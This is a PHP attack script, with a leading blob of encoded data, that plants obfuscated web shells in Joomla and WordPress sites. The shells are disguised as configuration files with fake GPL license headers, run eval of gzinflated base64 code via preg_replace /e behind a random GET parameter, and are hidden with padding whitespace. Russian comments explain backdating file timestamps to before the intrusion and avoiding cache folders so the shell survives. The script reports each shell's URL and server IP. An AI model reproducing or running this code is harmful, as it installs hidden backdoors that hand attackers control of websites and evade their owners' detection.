7+E+ctZaWI/h5+jftlXYH712NMkYZDKvFa9ar/sa1rq0do7iisWe3sK8ffRh0AhnwA069+TeGUSH9qD5A7KXvkPX8kd5T+X7PCzwEcWZmmUnmmwD+fl9WC45BuqReda0f51Y7xXfGn/ESoph0D5BR8GD5d9R/dCyxdZlJq96C2vL4tt8H4jZZfM9/+JSeI7YwNiPPMmhc6J1gSvIeaCXE1164/EzrJ3P0FDqLK4Lz/jK1Tk/c6v/d3/OEe7dPd6FQ8AAHpjyEG49yqenPXp+/jl+9+4R1mBNf///9//1HMfvPw/9+/ef37W//9O/vP6f87/8n//811/Hf/vrv//jP/zjn/9czH+9/mv+13/9H/f//J/yv3Liyb//l/8J\'\x29\x29\x29\x3B","");return $a[$i];} ';

$shell_step_6 = '?>';
$shell_step_7 = '<?php ';
$shell_step_8 = '$GLOBALS[\'_792768653_\'][0](_1195823703(0),_1195823703(1),_1195823703(2));';
$shell_step_9 = '?>';
$shell_step_10 = '																																																																																					<?php } else { $url_redirect = \'http://\'.$_SERVER[\'SERVER_NAME\']; header("Location: $url_redirect"); exit; } ?>';
			chmod($dir, 0755); // устанавливаем права на папку права на папку
			if (file_exists($path_shell))
				chmod($path_shell, 0755);

			// Создаем шелл	
			if (is_writable($dir))
			{
				$f = fopen ($path_shell, "w");
				fwrite($f, $shell_first_step."\n".$shell_step_1."\n".$shell_step_2.$shell_step_3.$shell_step_4.$shell_step_5.$shell_step_6.$shell_step_7.$shell_step_8.$shell_step_9."\n".$shell_step_10);
				fclose($f);
				
				if (file_exists($path_shell))	
				{
					touch($path_shell, $time_for_touch); 	// Делаем тач шелла на дату, до нашего прихода.
					touch($dir, $time_for_touch); 			// Делаем тач папки на дату, до нашего прихода.
				
					// Вывод результата
					$arr_good_path = array('/administrator/','/components/','/images/','/includes/','/language/','/libraries/','/media/','/modules/','/templates/','/plugins/');

					foreach ($arr_good_path as $dir_name)
					{
						$check_path = stristr($dir, $dir_name);
						if ($check_path != false)
						{
							$folder_name[] = $dir_name;
						}
					}

					$cnt = 0;
					for ($h=0; ($h < count($folder_name)); $h++)
					{
						$cuting_path[$h] = trim(strstr($dir, $folder_name[$h]));
						if ((strlen($cuting_path[$h])) > $cnt)
							$cnt = strlen($cuting_path[$h]);
					}

					foreach ($cuting_path as $each_way)
					{
						$each_way = trim($each_way);
						if (strlen($each_way) == $cnt)
						{
							$real_path_to_shell = $each_way;
							break;
						}
					}
					$server_IP = $_SERVER['SERVER_ADDR'];
					$real_path_to_shell = 'http://'.$_SERVER["SERVER_NAME"].$real_path_to_shell.$shell_name.'?'.$get;
					echo '<hr><hr>Joomla CMS - shell upload; '.$real_path_to_shell.' ; '.$server_IP.'<hr><hr>';
				}
				else
					echo '<hr><hr>Joomla CMS - Shell could not be created: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
			}
			else
				echo '<hr><hr>Joomla CMS - folder not writable: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
		}
		else
			echo '<hr><hr>Joomla CMS - Site is empty: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
	}
	
	elseif ($CMS == 'WordPress')
	{
		$arr_dir = finder_files($_SERVER['DOCUMENT_ROOT']);

		foreach ($arr_dir as $each)
		{
			// Исключаем папки tmp, cache, logs - ибо там шелл едва ли долго продержится.
			$iskl_dir1 = stristr($each, '/tmp/'); $iskl_dir2 = stristr($each, '/cache/'); $iskl_dir3 = stristr($each, '/logs/');

			$good_dir = stristr($each, '/wp-includes/'); $good_dir1 = stristr($each, '/wp-content/'); $good_dir2 = stristr($each, '/wp-admin/');

			if (($iskl_dir1 == false) and ($iskl_dir2 == false) and ($iskl_dir3 == false))
			{
				if (($good_dir != false) or ($good_dir1 != false) or ($good_dir2 != false))
				{
					$count_slash = substr_count($each, '/');
					$arr_all_folder[$count_slash] = $each;
				}
			}
		}
		
		if (count($arr_all_folder) > 3)
		{
			krsort($arr_all_folder);

			foreach ($arr_all_folder as $folder)
			{
				$arr_last_folder[] = trim($folder);
			}

			// END: Находим самую дальнюю папку на шелле. $arr_last_folder[0]

			$key_array = 0;	// Выбираем рандомно последнюю, предыпоследнюю, либо третью с конца по дальности расположения папку.
			$dir = str_replace(substr(strrchr($arr_last_folder[$key_array], "/"), 1), "", $arr_last_folder[$key_array]);	// Приводим путь к виду /dir/dir2/dir3

			// Формируем будущее имя шелла и GET запрос
			$shell_name = 'configuration.php';

			$arr_simb = array('q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m');
			shuffle($arr_simb);
			$get = rand(0,13).$arr_simb[0].$arr_simb[1].$arr_simb[2].$arr_simb[3].$arr_simb[4].$arr_simb[5].rand(0,13);


			$path_shell = $dir.$shell_name;
			$time_for_touch = filemtime($arr_last_folder[$key_array]);

			$shell_first_step = '<?php';
			$shell_step_1 = ' 
			/*
			 =====================================================
			 The license under which the WordPress software is 
			 released is the GPLv2 (or later) from the 
			 Free Software Foundation.
			 -----------------------------------------------------
			 http://ru.wordpress.org/
			 -----------------------------------------------------
			 Copyright (c) 2004,2014
			 =====================================================
			 Данный код защищен авторскими правами
			 =====================================================
			 Назначение: Конфигурация
			 =====================================================
			 GNU GENERAL PUBLIC LICENSE
			 Version 3, 29 June 2007
			 Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
			 Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
			*/
			';

			$shell_step_2 = ' 																																																																																																																																																							 chmod(dirname(__FILE__), 0511); chmod(__FILE__, 0404); if (isset($_REQUEST[\'action\'])){																								 				$GLOBALS[\'_792768653_\']=Array(\'pr\' .\'eg_replace\');                 ';
			$shell_step_2 = str_replace('action', $get, $shell_step_2);
			$shell_step_3 = '?>';
			$shell_step_4 = '<? ';
			$shell_step_5 = 'function _1195823703($i){$a=Array("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\'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